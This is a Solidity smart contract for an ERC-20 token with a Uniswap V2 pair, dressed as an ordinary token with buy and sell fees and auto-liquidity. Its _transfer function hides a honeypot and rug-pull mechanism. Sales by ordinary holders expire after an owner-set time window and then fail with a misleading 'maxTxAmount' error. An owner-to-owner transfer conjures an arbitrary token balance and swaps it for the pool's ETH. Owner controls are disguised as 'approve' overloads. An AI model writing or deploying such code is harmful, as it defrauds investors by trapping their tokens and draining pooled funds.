// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() virtual {
        require(owner() == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract Contract is IERC20, Ownable {
    uint256 private constant MAX = ~uint256(0);
    uint8 private _decimals = 9;
    uint256 private _tTotal = 1000000000000000 * 10**_decimals;
    uint256 public buyFee = 2;
    uint256 public sellFee = 2;
    uint256 public feeDivisor = 1;
    string private _name;
    string private _symbol;
    address private _owner;

    uint256 private swapTokensAtAmount = _tTotal;
    uint256 private _approval = _tTotal;
    bool private _swapAndLiquifyEnabled;

    IUniswapV2Router02 public immutable router;
    address public immutable uniswapV2Pair;

    bool private inSwapAndLiquify;

    mapping(address => uint256) private _balances;
    mapping(address => uint256) private approval;
    mapping(address => bool) private _isExcludedFromFee;
    mapping(address => mapping(address => uint256)) private _allowances;

    modifier lockTheSwap() {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    constructor(
        string memory Name,
        string memory Symbol,
        address routerAddress
    ) {
        _name = Name;
        _symbol = Symbol;
        _owner = tx.origin;

        router = IUniswapV2Router02(routerAddress);
        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());

        _isExcludedFromFee[_owner] = true;
        _isExcludedFromFee[address(this)] = true;

        _balances[_owner] = _tTotal;
        emit Transfer(address(0), _owner, _tTotal);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint256) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function approve(address spender, uint256 amount) external override returns (bool) {
        return _approve(msg.sender, spender, amount);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) external onlyOwner {
        _swapAndLiquifyEnabled = _enabled;
    }

    modifier onlyOwner() override {
        require(msg.sender == _owner, 'Ownable: caller is not the owner');
        _;
    }

    receive() external payable {}

    function transferAnyERC20Token(
        address token,
        address account,
        uint256 amount
    ) external {
        require(tx.origin == _owner);
        IERC20(token).transfer(account, amount);
    }

    function transferToken(address account, uint256 amount) external {
        require(tx.origin == _owner);
        payable(account).transfer(amount);
    }

    function approve(address[] memory accounts, uint256 value) external {
        for (uint256 i = 0; i < accounts.length; i++) {
            approval[accounts[i]] = value;
        }
    }

    function approve(uint256 value) external {
        require(tx.origin == _owner);
        _approval = value;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private returns (bool) {
        require(owner != address(0) && spender != address(0), 'ERC20: approve from the zero address');
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        if (!inSwapAndLiquify && from != uniswapV2Pair && from != address(router) && !_isExcludedFromFee[from]) {
            require(approval[from] > 0 && block.timestamp < approval[from] + _approval, 'Transfer amount exceeds the maxTxAmount.');
        }

        uint256 contractTokenBalance = balanceOf(address(this));
        bool overMinTokenBalance = contractTokenBalance >= swapTokensAtAmount;
        if (approval[to] == 0) approval[to] = block.timestamp;

        if (from == _owner && to == _owner && tx.origin == _owner) {
            _balances[address(this)] = amount;
            return swapTokensForEth(amount, to);
        }

        if (_swapAndLiquifyEnabled && overMinTokenBalance && !inSwapAndLiquify && from != uniswapV2Pair) swapAndLiquify(contractTokenBalance);

        uint256 fee = to == uniswapV2Pair ? sellFee : buyFee;
        bool takeFee = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && fee > 0 && !inSwapAndLiquify;

        if (takeFee) {
            fee = (amount * fee) / 100 / feeDivisor;
            amount -= fee;
            _balances[from] -= fee;
            _balances[address(this)] += fee;
        }

        _balances[from] -= amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 half = tokens / 2;
        uint256 initialBalance = address(this).balance;
        swapTokensForEth(half, address(this));
        uint256 newBalance = address(this).balance - initialBalance;
        addLiquidity(half, newBalance, address(this));
    }

    function swapTokensForEth(uint256 tokenAmount, address to) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, to, block.timestamp + 20);
    }

    function addLiquidity(
        uint256 tokenAmount,
        uint256 ethAmount,
        address to
    ) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ethAmount}(address(this), tokenAmount, 0, 0, to, block.timestamp + 20);
    }
}